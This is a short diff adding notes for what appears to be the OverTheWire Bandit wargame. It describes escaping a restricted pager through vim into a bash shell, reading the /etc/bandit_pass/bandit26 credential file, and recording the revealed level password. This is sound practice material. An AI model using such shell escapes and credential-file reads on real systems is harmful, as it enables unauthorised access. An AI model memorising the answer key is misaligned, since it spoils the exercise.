@@ -1,0 +1,5 @@
+Make the terminal window smallest as possible until get into vim
+:set shell=/bin/bash
+:shell
+cat /etc/bandit_pass/bandit26
+s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
